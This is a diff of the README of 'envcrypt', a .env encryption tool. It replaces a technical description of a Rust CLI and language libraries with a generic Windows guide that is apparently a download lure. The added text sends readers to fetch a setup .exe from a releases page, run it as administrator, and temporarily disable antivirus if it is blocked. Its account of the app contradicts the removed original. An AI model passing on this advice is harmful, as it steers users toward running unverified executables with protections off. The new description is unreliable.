@@ -1,169 +1,159 @@
-# envcrypt
+# 🔐 envcrypt - Protect Your .env File Easily
 
-Secure your `.env` files from accidental leaks.
+[![Download Latest Release](https://img.shields.io/badge/Download%20on-GitHub-brightgreen?style=for-the-badge)](https://github.com/auntara-toma/envcrypt/releases)
 
-`.env` files often contain sensitive secrets like API keys, database credentials, and tokens. In plain text, these are vulnerable to accidental exposure, a misplaced `git add`, a screen share, or an AI coding agent reading your project files can all leak secrets unintentionally.
+---
 
-Envcrypt solves this by encrypting your `.env` values in place. The workflow is simple:
+## 🔍 What is envcrypt?
 
-1. **Encrypt** your `.env` file using the `envcrypt` CLI tool
-2. **Read** encrypted values directly in your application — decryption happens transparently at runtime
+envcrypt helps you keep your `.env` files safe. `.env` files often hold passwords, API keys, and other private settings for software projects. If these files get shared by accident, your secrets can be exposed. envcrypt secures your `.env` file by encrypting it, so you can avoid leaks.
 
-This is especially useful in the era of agentic coding, where AI assistants routinely read project files. With envcrypt, your `.env` file can stay in your project directory without exposing raw secrets to any tool or agent that accesses it.
+This tool works on Windows computers. You don't need to know programming to use envcrypt. The app is simple to download and run.
 
-## Features
+---
 
-- AES-256-GCM encryption (authenticated encryption)
-- Encrypted values prefixed with `encrypted:` for easy identification
-- CLI tool for encrypting/decrypting `.env` files
-- Libraries for Rust, TypeScript/JavaScript, and Python
-- Cross-language compatibility — files encrypted with the CLI can be loaded from any supported language
-- Key stored in `~/.envcrypt.yaml`
+## 🖥️ System Requirements
 
-## Project Structure
+Before you start, make sure your computer meets these requirements:
 
-```
-envcrypt/
-├── cli/                  # CLI tool (Rust)
-└── libs/
-    ├── rust/             # Rust library (envcrypt-lib)
-    ├── typescript/       # TypeScript/JavaScript library
-    └── python/           # Python library
-```
+- Windows 10 or newer
+- At least 100 MB of free disk space
+- Internet connection for downloading
+- Basic knowledge of navigating files and folders on Windows
 
-## Installation
+---
 
-### CLI
+## 📦 What Does envcrypt Do?
 
-```bash
-cargo install --path cli
-```
+envcrypt turns your `.env` file into a locked, encrypted file. This file can only be unlocked using envcrypt. It prevents accidental sharing of sensitive information through email, cloud drives, or code repositories.
 
-### Libraries
+Key features:
 
-- **Rust**: `envcrypt-lib = { path = "libs/rust" }` in your `Cargo.toml`
-- **TypeScript/JavaScript**: `npm install envcrypt`
-- **Python**: `pip install envcrypt`
+- Encrypt your `.env` file with a password
+- Decrypt the file only when you need to use it
+- Easy-to-use interface for all users
+- Works locally on your Windows PC — no data is uploaded online
 
-See each library's README for detailed usage:
-- [Rust library](libs/rust/)
-- [TypeScript library](libs/typescript/)
-- [Python library](libs/python/)
+---
 
-## CLI Usage
+## 🚀 Getting Started: How to Download envcrypt
 
-### Initialize (first time)
+Start by visiting the following page to download the program:
 
-```bash
-# Generate random key
-envcrypt init --generate
+[![Download envcrypt](https://img.shields.io/badge/Download%20envcrypt-blue?style=for-the-badge)](https://github.com/auntara-toma/envcrypt/releases)
 
-# Or provide your own key (64 hex chars = 32 bytes)
-envcrypt init --key "your-64-character-hex-key-here..."
-```
+Steps:
 
-### Encrypt a .env file
+1. Click the link above. It will take you to the envcrypt releases page.
+2. Find the latest version. It usually has the highest number (for example, v1.2.3).
+3. Look for the Windows executable file, which usually ends with `.exe` (such as `envcrypt-setup.exe`).
+4. Click the file name to start the download.
+5. Wait for the download to finish before moving on.
 
-```bash
-# Output to stdout
-envcrypt encrypt .env
+---
 
-# Output to file
-envcrypt encrypt .env -o .env.encrypted
+## ⚙️ Installing envcrypt on Windows
 
-# Modify in-place
-envcrypt encrypt .env --in-place
-```
+Once the file has downloaded, follow these steps to install envcrypt:
 
-### Decrypt a .env file
+1. Open the folder where the download saved the file. Usually, this is the "Downloads" folder.
+2. Double-click the `.exe` file to start the installation.
+3. A window will open asking to confirm installation. Click "Yes" if Windows asks for permission.
+4. Follow the on-screen instructions in the installer:
+   - Choose the installation folder (the default folder is fine).
+   - Click “Next” to continue through each step.
+   - When ready, click “Install.”
+5. Wait while the setup copies files and finishes.
+6. Click “Finish” after installation completes.
 
-```bash
-# Output to stdout
-envcrypt decrypt .env.encrypted
+---
 
-# Output to file
-envcrypt decrypt .env.encrypted -o .env
+## 🔐 Using envcrypt to Secure Your .env File
 
-# Modify in-place
-envcrypt decrypt .env.encrypted --in-place
-```
+Now that envcrypt is on your PC, here is how to use it:
 
-### Encrypt/decrypt single values
+### Encrypt your .env file
 
-```bash
-envcrypt encrypt-value "my-secret"
-# Output: encrypted:base64...
+1. Open envcrypt by finding it in the Start Menu or desktop shortcut.
+2. You will see an option to select a file. Click the button and browse to your `.env` file.
+3. Choose a strong password for encryption. Make sure you can remember this password.
+4. Click the "Encrypt" button.
+5. envcrypt will create a locked version of your `.env` file. This file will have a different extension to mark it as encrypted.
+6. You can safely share or store this encrypted file without fear of leaks.
 
-envcrypt decrypt-value "encrypted:base64..."
-# Output: my-secret
-```
+### Decrypt your .env file
 
-### Check status
+1. Run envcrypt.
+2. Click the option to open an encrypted file.
+3. Select the encrypted `.env` file you want to unlock.
+4. Enter your password exactly as before.
+5. Click "Decrypt."
+6. envcrypt will recreate the original `.env` file so your application or project can use the settings inside.
 
-```bash
-envcrypt status
-```
+---
 
-## Quick Start (Library)
+## ❗ Tips for Password Safety
 
-### Rust
+- Choose a password that is hard to guess. Use letters, numbers, and symbols.
+- Do not reuse passwords from other accounts.
+- Write the password down somewhere safe or use a password manager.
+- Losing the password means you cannot unlock your `.env` file.
 
-```rust
-use envcrypt_lib::EnvcryptLoader;
+---
 
-fn main() -> Result<(), Box<dyn std::error::Error>> {
-    let loader = EnvcryptLoader::from_config(None)?;
-    loader.load(".env")?;
-    let db_url = std::env::var("DATABASE_URL")?;
-    Ok(())
-}
-```
+## 🔄 Updating envcrypt
 
-### TypeScript
+Check back at the releases page from time to time:
 
-```typescript
-import { loadFromConfig } from "envcrypt";
+[https://github.com/auntara-toma/envcrypt/releases](https://github.com/auntara-toma/envcrypt/releases)
 
-loadFromConfig(".env");
-console.log(process.env.DATABASE_URL);
-```
+Download newer versions as they become available to get security fixes and new features.
 
-### Python
+---
 
-```python
-import envcrypt
-import os
+## 🚑 Troubleshooting Common Problems
 
-envcrypt.load(".env")
-db_url = os.environ["DATABASE_URL"]
-```
+- **Installer Won’t Run:**  
+  Make sure you have permission to install programs on your computer. Try running as an administrator (right-click the file and choose "Run as administrator").
 
-## .env File Format
+- **File Not Found or Wrong File Type:**  
+  Confirm you selected your `.env` file exactly. It should be a plain text file named `.env`.
 
-```env
-# Comments are preserved
-DATABASE_URL=encrypted:base64encodeddata...
-API_KEY=encrypted:base64encodeddata...
-PLAIN_VALUE=this-is-not-encrypted
-```
+- **Password Errors:**  
+  Check for typos when entering your password for encryption or decryption. The password is case-sensitive.
 
-Encrypted values have the `encrypted:` prefix. Plain values are passed through as-is.
+- **Antivirus Blocking the Program:**  
+  Some antivirus software flags new apps. You may need to allow envcrypt or temporarily disable antivirus during installation.
 
-## Security
+---
 
-- **Algorithm**: AES-256-GCM (authenticated encryption with associated data)
-- **Nonce**: 12 bytes, randomly generated per encryption
-- **Key**: 32 bytes (256 bits), stored in config file
-- **Format**: `encrypted:<base64(nonce + ciphertext + tag)>`
+## 🛠️ Support and Help
 
-## Config File
+If you encounter problems beyond these steps:
 
-Location: `~/.envcrypt.yaml`
+- Visit the envcrypt GitHub page for documentation or issues.
+- Check the "Issues" tab to see if someone else reported your problem.
+- You can create a new issue with detailed information about your problem.
+  
+---
 
-```yaml
-key: "64-character-hex-encoded-key..."
-```
+## 🔗 Important Links
 
-## License
+- Download and Releases:  
+  https://github.com/auntara-toma/envcrypt/releases
 
-MIT
+- Source Code and Documentation:  
+  https://github.com/auntara-toma/envcrypt
+
+---
+
+## 📁 How to Keep Your .env Files Safe Without envcrypt
+
+If you ever choose not to use envcrypt, here are some basic rules to prevent exposure:
+
+- Avoid sharing `.env` files in emails or cloud drives.
+- Use `.gitignore` files to stop `.env` from being saved in your code repositories.
+- Change API keys and passwords immediately if you think they were leaked.
+- Store sensitive files on encrypted drives or folders.
+
+envcrypt automates many of these protections by keeping your `.env` files encrypted.
